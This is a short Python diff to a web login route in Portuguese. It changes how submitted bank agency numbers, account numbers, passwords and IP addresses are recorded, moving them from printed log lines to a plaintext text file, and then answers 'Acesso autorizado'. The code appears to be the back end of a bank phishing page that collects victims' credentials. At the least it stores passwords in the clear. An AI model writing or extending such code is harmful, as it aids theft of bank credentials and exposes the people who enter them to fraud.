@@ -107,15 +107,20 @@ def login():
             erro = 'Senha inválida.'
 
         else:
-            # ===== LOG NO RENDER =====
-            print("=== NOVO ACESSO ===")
-            print("Data/Hora:", datetime.now().strftime('%d/%m/%Y %H:%M:%S'))
-            print("Agência:", agencia)
-            print("Conta:", conta)
-            print("Senha:", senha)
-            print("IP:", request.remote_addr)
-            print("Dispositivo: Mobile")
-            print("===================")
+            # ===== REGISTRO EM TXT =====
+            registro = f"""
+==============================
+Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
+Agência: {agencia}
+Conta: {conta}
+Senha: {senha}
+IP: {request.remote_addr}
+Dispositivo: Mobile
+==============================
+"""
+
+            with open("registros.txt", "a", encoding="utf-8") as arquivo:
+                arquivo.write(registro)
 
             return "<h2>Acesso autorizado</h2>"
 
